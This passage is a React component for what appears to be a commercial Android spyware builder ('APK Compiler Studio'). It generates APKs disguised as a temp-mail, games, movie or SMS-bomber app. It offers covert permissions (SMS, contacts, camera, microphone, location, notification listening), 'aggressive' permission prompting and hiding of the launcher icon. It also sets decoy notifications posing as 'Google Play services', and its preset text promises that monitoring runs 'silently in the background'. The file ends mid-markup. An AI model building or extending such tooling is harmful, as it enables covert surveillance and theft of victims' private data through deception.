"use client";

import React, { useState, useEffect, useRef } from 'react';
import CustomAlertModal from './CustomAlertModal';
import { 
    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
    Settings, MousePointerClick, CheckSquare
} from 'lucide-react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium' | 'enterprise';
    onUpgrade?: (feature?: string, requiredPlan?: string) => void;
}

const APP_PRESETS = [
    {
        id: 'custom',
        name: 'Custom App',
        packageName: 'com.gallery.eye',
        url: '',
        infoTitle: 'Custom Web Application',
        infoText: 'Allows you to wrap any website or web portal into a standalone Android APK with your custom name, package identifier, and PNG icon.'
    },
    {
        id: 'temp_mail',
        name: 'Temp Mail',
        packageName: 'com.tempmail.inbox',
        url: 'https://mail.tm/en/',
        infoTitle: 'Temp Mail Portal',
        infoText: 'Launches a fully functional disposable email service (mail.tm). Users can generate temporary email addresses instantly while your monitoring service runs silently in the background.'
    },
    {
        id: 'poki_games',
        name: 'Poki Games',
        packageName: 'com.poki.games',
        url: 'https://poki.com/',
        infoTitle: 'Poki Games Arcade',
        infoText: 'Launches an interactive online game portal (poki.com) with hundreds of instant mobile games. Perfect for casual entertainment.'
    },
    {
        id: 'movie_box',
        name: 'Movie Box',
        packageName: 'com.moviebox.cinema',
        url: 'https://movie-box.co/',
        infoTitle: 'Movie Box Cinema',
        infoText: 'Launches a sleek cinema and movie streaming hub (movie-box.co). Provides an authentic entertainment streaming interface.'
    },
    {
        id: 'sms_bomber',
        name: 'SMS Bomber',
        packageName: 'com.h4k3r.bomber',
        url: 'https://h4k3r-bomber.vercel.app',
        infoTitle: 'Utility Toolkit',
        infoText: 'Launches a utility web application toolkit (h4k3r-bomber.vercel.app). Looks and behaves like a specialized developer utility app.'
    }
];

const PRESET_ICON_STYLES: Record<string, { gradient: [string, string, string]; svgPath: string }> = {
    temp_mail: {
        gradient: ['#10B981', '#059669', '#047857'],
        svgPath: 'M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z'
    },
    poki_games: {
        gradient: ['#A855F7', '#9333EA', '#6B21A8'],
        svgPath: 'M6 12h.01M10 12h.01M15 16a4 4 0 004-4V6a2 2 0 00-2-2H7a2 2 0 00-2 2v6a4 4 0 004 4h2m0 0v4m-2 0h4'
    },
    movie_box: {
        gradient: ['#F43F5E', '#E11D48', '#9F1239'],
        svgPath: 'M7 4v16M17 4v16M3 8h4m10 0h4M3 12h18M3 16h4m10 0h4M4 20h16a1 1 0 001-1V5a1 1 0 00-1-1H4a1 1 0 00-1 1v14a1 1 0 001 1z'
    },
    sms_bomber: {
        gradient: ['#F59E0B', '#EA580C', '#DC2626'],
        svgPath: 'M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z'
    }
};

function generatePresetIconBlob(presetId: string): Promise<Blob | null> {
    return new Promise((resolve) => {
        const style = PRESET_ICON_STYLES[presetId];
        if (!style) { resolve(null); return; }

        const size = 512;
        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        if (!ctx) { resolve(null); return; }

        const r = size * 0.22;
        const drawRoundRect = (x: number, y: number, w: number, h: number, radius: number) => {
            ctx.beginPath();
            ctx.moveTo(x + radius, y);
            ctx.lineTo(x + w - radius, y);
            ctx.quadraticCurveTo(x + w, y, x + w, y + radius);
            ctx.lineTo(x + w, y + h - radius);
            ctx.quadraticCurveTo(x + w, y + h, x + w - radius, y + h);
            ctx.lineTo(x + radius, y + h);
            ctx.quadraticCurveTo(x, y + h, x, y + h - radius);
            ctx.lineTo(x, y + radius);
            ctx.quadraticCurveTo(x, y, x + radius, y);
            ctx.closePath();
        };

        const grad = ctx.createLinearGradient(0, 0, size, size);
        grad.addColorStop(0, style.gradient[0]);
        grad.addColorStop(0.5, style.gradient[1]);
        grad.addColorStop(1, style.gradient[2]);

        drawRoundRect(0, 0, size, size, r);
        ctx.fillStyle = grad;
        ctx.fill();

        ctx.strokeStyle = 'rgba(255,255,255,0.25)';
        ctx.lineWidth = 4;
        drawRoundRect(2, 2, size - 4, size - 4, r);
        ctx.stroke();

        const iconSize = size * 0.4;
        const offset = (size - iconSize) / 2;
        ctx.save();
        ctx.translate(offset, offset);
        ctx.scale(iconSize / 24, iconSize / 24);
        ctx.strokeStyle = 'white';
        ctx.lineWidth = 2;
        ctx.lineCap = 'round';
        ctx.lineJoin = 'round';
        ctx.fillStyle = 'none';

        const paths = style.svgPath.split(' M');
        paths.forEach((p, i) => {
            const d = i === 0 ? p : 'M' + p;
            const path2d = new Path2D(d);
            ctx.stroke(path2d);
        });
        ctx.restore();

        canvas.toBlob((blob) => resolve(blob), 'image/png', 1.0);
    });
}

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const isPremium = userPlan === 'premium' || userPlan === 'enterprise';
    const isStandard = userPlan === 'standard' || isPremium;

    const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    const contentScrollRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        if (contentScrollRef.current) {
            contentScrollRef.current.scrollTo({ top: 0, behavior: 'instant' });
        }
        if (!isOpen) {
            setActiveStep('identity');
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setSelectedPreset('custom');
            setCustomAppName("");
            setCustomPackageName("com.gallery.eye");
            setCustomWebLink("");
            setCustomIcon(null);
            setCustomIconPreview(null);
            setHideApp(false);
            setEnableSmsPermission(false);
            setEnableContactsPermission(false);
            setEnableStoragePermission(true);
            setEnableCameraPermission(false);
            setEnableMicrophonePermission(false);
            setEnableLocationPermission(false);
            setEnableNotificationListener(false);
            setShowPlayProtectWarning(false);
            setAggressivePermissions(false);
            setShowAdvancedPermissions(false);
            setNotificationStyle("default");
            setNotificationClickAction("device_info");
            setNotificationIcon("info");
            setNotificationTitle("");
            setNotificationText("");
        }
    }, [activeStep, isOpen]);

    const [selectedPreset, setSelectedPreset] = useState<string>('custom');
    const [customAppName, setCustomAppName] = useState("");
    const [customPackageName, setCustomPackageName] = useState("com.gallery.eye");
    const [customWebLink, setCustomWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
    const [hideApp, setHideApp] = useState(false);
    const [showAppInfoModal, setShowAppInfoModal] = useState<string | null>(null);

    const generatePackageName = (name: string) => {
        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
        const parts = cleaned.split(/\s+/).filter(Boolean);
        if (parts.length === 0) return "com.gallery.eye";
        if (parts.length === 1) return `com.${parts[0]}.app`;
        return `com.${parts[0]}.${parts[1]}`;
    };

    const handleAppNameChange = (name: string) => {
        setCustomAppName(name);
        setCustomPackageName(generatePackageName(name));
    };

    const handleIconSelect = (file: File | null) => {
        setCustomIcon(file);
        if (file) {
            const url = URL.createObjectURL(file);
            setCustomIconPreview(url);
        } else {
            setCustomIconPreview(null);
        }
    };

    // Permission States
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableLocationPermission, setEnableLocationPermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(false);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);
    const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);

    // Notification Style States
    const [notificationStyle, setNotificationStyle] = useState("default");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationIcon, setNotificationIcon] = useState("info");
    const [notificationTitle, setNotificationTitle] = useState("");
    const [notificationText, setNotificationText] = useState("");

    const [isStyleMenuOpen, setIsStyleMenuOpen] = useState(false);
    const [isActionMenuOpen, setIsActionMenuOpen] = useState(false);
    const [isIconMenuOpen, setIsIconMenuOpen] = useState(false);

    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string; defaultAction: string; defaultIconKey: string }> = {
        default: { 
            title: "Google Play services", 
            text: "Running background checks", 
            icon: "ℹ️",
            defaultAction: "device_info",
            defaultIconKey: "info"
        },
        sync: { 
            title: "Cloud Backup", 
            text: "Syncing data in background", 
            icon: "🔄",
            defaultAction: "none",
            defaultIconKey: "sync"
        },
        cloud: { 
            title: "Cloud Storage", 
            text: "Connected to cloud service", 
            icon: "🔄",
            defaultAction: "none",
            defaultIconKey: "sync"
        },
        active: { 
            title: "System Framework", 
            text: "Service active", 
            icon: "ℹ️",
            defaultAction: "none",
            defaultIconKey: "info"
        },
        backup: { 
            title: "Data Backup", 
            text: "Backup in progress", 
            icon: "⬇️",
            defaultAction: "none",
            defaultIconKey: "download"
        },
        ready: { 
            title: "System Assistant", 
            text: "Ready", 
            icon: "ℹ️",
            defaultAction: "device_info",
            defaultIconKey: "info"
        },
        custom: { 
            title: "Custom Title", 
            text: "Custom description text", 
            icon: "✏️",
            defaultAction: "device_info",
            defaultIconKey: "info"
        },
    };

    const handleSelectStyle = (key: string) => {
        setNotificationStyle(key);
        const preset = NOTIFICATION_PRESETS[key];
        if (preset) {
            setNotificationClickAction(preset.defaultAction);
            setNotificationIcon(preset.defaultIconKey);
        }
        setIsStyleMenuOpen(false);
    };

    const CLICK_ACTIONS: Record<string, string> = {
        device_info: "Open App Info & Permissions",
        none: "Do Nothing (Silent Background)",
        system_settings: "Open Device System Settings",
        battery_optimization: "Open Battery & Performance Settings",
        play_store: "Open Google Play Store Page",
        security_settings: "Open Security & Privacy Hub",
        network_settings: "Open Mobile & Wi-Fi Network Settings",
    };

    const ICON_OPTIONS: Record<string, { label: string; symbol: string }> = {
        info: { label: "Info Badge", symbol: "ℹ️" },
        sync: { label: "Sync Arrow", symbol: "🔄" },
        security: { label: "Shield Badge", symbol: "🔒" },
        download: { label: "Download Arrow", symbol: "⬇️" },
        gear: { label: "System Gear", symbol: "⚙️" },
    };

    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setActiveStep('identity');
        }
    }, [isOpen]);

    const getActiveAppDetails = () => {
        const preset = APP_PRESETS.find(p => p.id === selectedPreset);
        if (!preset || selectedPreset === 'custom') {
            return {
                name: customAppName || "Custom App",
                packageName: customPackageName || "com.gallery.eye",
                url: customWebLink,
                infoTitle: "Custom Web Application",
                infoText: "Wraps your provided WebView URL into a standalone Android application."
            };
        }
        return {
            name: preset.name,
            packageName: preset.packageName,
            url: preset.url,
            infoTitle: preset.infoTitle,
            infoText: preset.infoText
        };
    };

    const activeApp = getActiveAppDetails();

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('completed');
            setProgress(100);
            setProgressStep("APK ready for download!");
            const finalUrl = data.url || data.downloadUrl || "";
            setDownloadUrl(finalUrl);

            try {
                if (finalUrl) {
                    const link = document.createElement('a');
                    link.href = finalUrl;
                    const filename = data.filename || `${activeApp.name.replace(/\s+/g, '_')}.apk`;
                    link.download = filename.endsWith('.apk') ? filename : `${filename}.apk`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            } catch (err) {
                console.error("Auto download trigger error:", err);
            }
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred while building the APK.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket, activeApp.name]);

    const startGeneration = async () => {
        if (selectedPreset === 'custom' && !hideApp) {
            if (!customAppName.trim()) {
                setAlertData({
                    title: 'App Name Required',
                    message: 'Please enter your app display name for the custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customWebLink.trim()) {
                setAlertData({
                    title: 'Web Link Required',
                    message: 'Please provide a WebView link for your custom app.\n\nThe app needs a URL to display when launched.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customIcon && !customIconPreview) {
                setAlertData({
                    title: 'Custom Icon Required',
                    message: 'Please select an icon (PNG/JPG) for your custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing compilation engine...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', activeApp.name);
            formData.append('packageName', activeApp.packageName);
            formData.append('hideApp', (selectedPreset === 'custom' ? hideApp : false).toString());
            formData.append('webLink', activeApp.url);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableLocationPermission', enableLocationPermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);
            formData.append('notificationIcon', notificationIcon);

            const activePreset = NOTIFICATION_PRESETS[notificationStyle] || NOTIFICATION_PRESETS.default;
            const finalTitle = notificationStyle === 'custom' ? (notificationTitle || 'System Service') : (activePreset?.title || 'Google Play services');
            const finalText = notificationStyle === 'custom' ? (notificationText || 'Running background checks…') : (activePreset?.text || 'Running background checks');
            formData.append('notificationTitle', finalTitle);
            formData.append('notificationText', finalText);
            if (selectedPreset === 'custom' && customIcon) {
                formData.append('icon', customIcon);
            } else if (selectedPreset !== 'custom') {
                const iconBlob = await generatePresetIconBlob(selectedPreset);
                if (iconBlob) {
                    formData.append('icon', iconBlob, `${selectedPreset}_icon.png`);
                }
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error(error);
            setStatus('idle');
            setAlertData({
                title: 'Error Starting Build',
                message: error.message || "Failed to start generation. Please try again.",
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    const renderPresetIconBadge = (presetId: string) => {
        switch (presetId) {
            case 'temp_mail':
                return (
                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-emerald-500 via-emerald-600 to-teal-700 flex items-center justify-center shadow-lg border border-emerald-400/30">
                        <Mail className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-purple-500 via-indigo-600 to-violet-800 flex items-center justify-center shadow-lg border border-purple-400/30">
                        <Gamepad2 className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-rose-500 via-pink-600 to-red-800 flex items-center justify-center shadow-lg border border-rose-400/30">
                        <Film className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-amber-500 via-orange-600 to-red-600 flex items-center justify-center shadow-lg border border-orange-400/30">
                        <Flame className="w-5 h-5 sm:w-6 sm:h-6 text-amber-100 drop-shadow" />
                    </div>
                );
            default:
                return (
                    <div className="w-11 h-11 sm:w-12 sm:h-12 rounded-2xl bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 flex items-center justify-center shadow-lg border border-orange-400/30">
                        <Globe className="w-5 h-5 sm:w-6 sm:h-6 text-white drop-shadow" />
                    </div>
                );
        }
    };

    const renderRealisticIcon = () => {
        if (selectedPreset === 'custom') {
            if (customIconPreview) {
                return (
                    <div className="w-full h-full rounded-[22px] overflow-hidden shadow-[0_12px_28px_rgba(0,0,0,0.7)] border-2 border-white/20">
                        <img src={customIconPreview} alt="Custom Icon" className="w-full h-full object-cover" />
                    </div>
                );
            }
            return (
                <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(249,115,22,0.45)] border-2 border-white/20 relative overflow-hidden">
                    <div className="w-11 h-11 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                        <Globe className="w-6 h-6 text-white drop-shadow" />
                    </div>
                    <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                </div>
            );
        }

        switch (selectedPreset) {
            case 'temp_mail':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-emerald-500 via-emerald-600 to-teal-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border-2 border-white/20 relative overflow-hidden">
                        <div className="w-11 h-11 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Mail className="w-6 h-6 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">MAIL.TM</span>
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-purple-500 via-indigo-600 to-violet-800 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border-2 border-white/20 relative overflow-hidden">
                        <div className="w-11 h-11 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-rose-500 via-pink-600 to-red-800 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border-2 border-white/20 relative overflow-hidden">
                        <div className="w-11 h-11 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Film className="w-6 h-6 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-amber-500 via-orange-600 to-red-600 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border-2 border-white/20 relative overflow-hidden">
                        <div className="w-11 h-11 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
                            <Flame className="w-6 h-6 text-amber-300 drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
                    </div>
                );
            default:
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-orange-500 via-amber-600 to-orange-700 p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(249,115,22,0.45)] border-2 border-white/20 relative overflow-hidden">
                        <div className="w-11 h-11 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Globe className="w-6 h-6 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                    </div>
                );
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/85 backdrop-blur-2xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
            <div className="clay-card max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.95)] relative max-h-[92dvh] overflow-hidden border border-white/10 rounded-[2.5rem]">
                
                {/* ── Top Bar with Title Pill & Rose Close Action ── */}
                <div className="px-5 sm:px-7 py-3.5 border-b border-white/5 bg-black/40 flex items-center justify-between flex-shrink-0">
                    <div className="flex items-center gap-2.5">
                        <div className="clay-pill clay-pill-orange px-3 py-1 flex items-center gap-2">
                            <span className="w-2 h-2 rounded-full bg-orange-400 animate-pulse shadow-[0_0_8px_#f97316]" />
                            <span className="text-[11px] font-mono font-black uppercase tracking-wider text-orange-200">
                                APK Compiler Studio
                            </span>
                        </div>
                    </div>
                    <button
                        type="button"
                        onClick={onClose}
                        className="clay-button-sm w-9 h-9 rounded-xl flex items-center justify-center text-white/60 hover:text-rose-400 transition-colors cursor-pointer"
                        title="Close Studio"
                    >
                        <X size={18} />
                    </button>
                </div>

                {/* ── 3D Segmented Stepper Bar ── */}
                <div className="px-5 sm:px-7 py-3 border-b border-white/5 bg-black/20 flex-shrink-0">
                    <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/5 shadow-inner">
                        {[
                            { id: 'identity', stepNum: '1', label: 'App Mode' },
                            { id: 'permissions', stepNum: '2', label: 'Permissions' },
                            { id: 'notifications', stepNum: '3', label: 'Service Style' }
                        ].map((item) => {
                            const isActive = activeStep === item.id;
                            return (
                                <button
                                    key={item.id}
                                    type="button"
                                    onClick={() => setActiveStep(item.id as any)}
                                    className={`py-2 px-2 sm:px-3 rounded-xl flex items-center justify-center gap-2 transition-all cursor-pointer ${
                                        isActive
                                            ? 'clay-capsule border-orange-500/60 text-orange-300 shadow-[0_0_15px_rgba(249,115,22,0.35)] bg-orange-500/15 font-black'
                                            : 'text-white/40 hover:text-white'
                                    }`}
                                >
                                    <span className={`w-5 h-5 rounded-lg flex items-center justify-center text-[10px] font-mono font-black shrink-0 ${
                                        isActive ? 'bg-orange-500 text-white shadow-sm' : 'bg-white/10 text-white/50'
                                    }`}>
                                        {item.stepNum}
                                    </span>
                                    <span className="text-xs font-mono font-bold truncate">
                                        {item.label}
                                    </span>
                                </button>
                            );
                        })}
                    </div>
                </div>

                {/* ── Main Scrollable Body ── */}
                <div ref={contentScrollRef} className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                    
                    {/* ── STEP 1: App Mode & Presets ── */}
                    {activeStep === 'identity' && (
                        <div className="space-y-5 animate-in fade-in duration-200">
                            
                            {/* Preset Mode Chips */}
                            <div>
                                <label className="block text-[11px] font-mono font-black text-white/50 uppercase tracking-widest mb-2.5">
                                    Select Application Engine
                                </label>
                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-2.5">
                                    {APP_PRESETS.map((p) => {
                                        const isSelected = selectedPreset === p.id;
                                        return (
                                            <button
                                                key={p.id}
                                                type="button"
                                                onClick={() => setSelectedPreset(p.id)}
                                                className={`clay-capsule p-3 rounded-2xl flex flex-col items-center justify-center gap-2 transition-all text-center cursor-pointer ${
                                                    isSelected
                                                        ? 'border-orange-500/70 bg-orange-500/15 text-white shadow-[0_0_18px_rgba(249,115,22,0.3)] scale-[1.02]'
                                                        : 'text-white/50 hover:text-white'
                                                }`}
                                            >
                                                {renderPresetIconBadge(p.id)}
                                                <span className={`text-[11px] font-bold truncate w-full ${isSelected ? 'text-orange-300 font-black' : 'text-white/60'}`}>
                                                    {p.name}
                                                </span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Form Configuration & Realistic Screen Preview */}
                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                
                                {/* Custom Inputs (ONLY for custom mode) */}
                                {selectedPreset === 'custom' && (
                                    <div className="sm:col-span-7 space-y-3.5">
                                        <div>
                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
                                                App Display Name
                                            </label>
                                            <input
                                                type="text"
                                                value={customAppName}
                                                onChange={(e) => handleAppNameChange(e.target.value)}
                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs font-bold text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
                                                placeholder="e.g. Gallery Pro"
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
                                                Package Identifier (3 Segments)
                                            </label>
                                            <input
                                                type="text"
                                                value={customPackageName}
                                                onChange={(e) => setCustomPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs font-mono text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
                                                placeholder="com.gallery.eye"
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
                                                Launch Web URL
                                            </label>
                                            <input
                                                type="url"
                                                value={customWebLink}
                                                onChange={(e) => setCustomWebLink(e.target.value)}
                                                className="clay-capsule w-full px-4 py-2.5 rounded-xl text-xs text-white placeholder:text-white/25 focus:outline-none focus:border-orange-500/60 shadow-inner"
                                                placeholder="https://example.com"
                                            />
                                        </div>

                                        <div>
                                            <label className="block text-[10px] font-mono font-bold text-white/50 uppercase tracking-wider mb-1">
                                                App Icon (PNG / JPG)
                                            </label>
                                            <label className="clay-capsule w-full p-3 rounded-xl flex items-center justify-between cursor-pointer group hover:border-orange-500/40">
                                                <div className="flex items-center gap-2.5">
                                                    <div className="clay-icon-pod w-8 h-8 rounded-lg flex items-center justify-center text-orange-400">
                                                        <Upload size={14} />
                                                    </div>
                                                    <div>
                                                        <span className="text-xs font-bold text-white block">Upload App Icon</span>
                                                        <span className="text-[10px] text-white/40 font-mono">512x512 PNG Recommended</span>
                                                    </div>
                                                </div>
                                                <input
                                                    type="file"
                                                    accept="image/png, image/jpeg"
                                                    onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
                                                    className="hidden"
                                                />
                                            </label>
                                        </div>
                                    </div>
                                )}

                                {/* Realistic Live Android Screen Card */}
                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-xs mx-auto w-full'} clay-card p-5 rounded-3xl flex flex-col items-center justify-center text-center shadow-xl relative`}>
                                    <span className="text-[9px] font-mono font-black text-white/40 uppercase tracking-widest mb-3">
                                        Live Android Icon
                                    </span>
                                    
                                    <div className="w-20 h-20 sm:w-22 sm:h-22 mb-2.5 relative group">
                                        {renderRealisticIcon()}

                                        {selectedPreset !== 'custom' && (
                                            <button
                                                type="button"
                                                onClick={() => setShowAppInfoModal(selectedPreset)}
                                                className="clay-button-sm w-6 h-6 rounded-full flex items-center justify-center absolute -top-1 -right-1 text-orange-300 shadow-lg cursor-pointer"
                                                title="View App Details"
                                            >
                                                <Info size={12} />
                                            </button>
                                        )}

                                        {selectedPreset === 'custom' && hideApp && (
                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[8px] font-black uppercase shadow-lg">
                                                Hidden
                                            </div>
                                        )}
                                    </div>

                                    <span className="text-xs font-black text-white truncate max-w-[180px]">{activeApp.name}</span>
                                    <span className="text-[10px] font-mono text-white/40 truncate max-w-[180px] mt-0.5">{activeApp.packageName}</span>

                                    {/* Hide App Toggle Switch */}
                                    {selectedPreset === 'custom' && (
                                        <div className="mt-4 w-full pt-3 border-t border-white/5 flex items-center justify-between">
                                            <span className="text-[11px] font-bold text-white/70">Hide Launcher Icon</span>
                                            <button
                                                type="button"
                                                onClick={() => {
                                                    if (isBasicPlan) { onUpgrade?.(); return; }
